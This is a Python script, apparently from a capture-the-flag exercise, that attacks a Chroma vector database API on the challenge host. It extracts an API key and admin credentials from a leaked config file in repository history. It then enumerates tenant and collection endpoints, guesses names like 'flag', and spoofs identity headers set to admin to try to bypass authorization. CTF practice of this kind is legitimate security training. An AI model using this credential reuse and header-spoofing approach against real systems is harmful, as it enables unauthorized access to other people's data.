#!/usr/bin/env python
"""Chroma 1.0.0's real route table is tenant-scoped: /api/v2/tenants/{t}/databases/{d}/collections.
My earlier sweep only tried flat /api/v2/collections, which does not exist in 1.x.
`auth/identity` already handed me the tenant and database names, so the paths are fully known."""
import base64, json, re, urllib.error, urllib.request, concurrent.futures as cf
CFG = open("files/repo-history/c2/config.php", encoding="utf-8").read()
KEY = re.search(r"INTERNAL_API_KEY',\s*'([^']+)'", CFG).group(1)
USER = re.search(r"MAIL_ADMIN_USER',\s*'([^']+)'", CFG).group(1)
PW = re.search(r"MAIL_ADMIN_PASS',\s*'([^']+)'", CFG).group(1)
BASIC = base64.b64encode(("%s:%s" % (USER, PW)).encode()).decode()
BASE = "http://vec.web.2026.sunshinectf.games:8000"
T, D = "default_tenant", "default_database"
def go(args):
    method, path, body, extra = args
    h = {"Content-Type": "application/json", "X-API-Key": KEY, "Authorization": "Basic " + BASIC}
    h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return method, path, r.status, r.read()
    except urllib.error.HTTPError as e:
        return method, path, e.code, e.read()
    except Exception as e:
        return method, path, type(e).__name__, str(e).encode()
P = "/api/v2/tenants/%s/databases/%s" % (T, D)
jobs = [("GET", p, None, {}) for p in [
    "/api/v2/tenants", "/api/v2/tenants/" + T, P, P + "/collections", P + "/collections_count",
    P + "/collections/specs", P + "/collections/default", "/api/v2/pre-flight-checks",
    "/api/v1/pre-flight-checks", "/api/v1/version", "/api/v1/heartbeat", "/api/v1/collections"]]
for name in ["specs", "default", "flag", "chroma", "vecnet", "mail", "documents", "embeddings"]:
    jobs.append(("GET", P + "/collections/" + name, None, {}))
    jobs.append(("POST", P + "/collections/get", {"name": name}, {}))
    jobs.append(("POST", P + "/collections/get_or_create", {"name": name, "configuration": {}}, {}))
jobs.append(("POST", P + "/collections", {"name": "probe1", "get_or_create": True}, {}))
jobs.append(("GET", P + "/collections", None, {"chroma-user-id": "admin", "SM_USER": "admin",
                                               "X-CHROMA-USER-ID": "admin"}))
jobs.append(("POST", "/api/v2/auth/identity", None, {}))
if __name__ == "__main__":
    with cf.ThreadPoolExecutor(12) as ex:
        for m, p, st, b in ex.map(go, jobs):
            print("%-5s %-58s %-4s %s" % (m, p, st, b[:230]), flush=True)
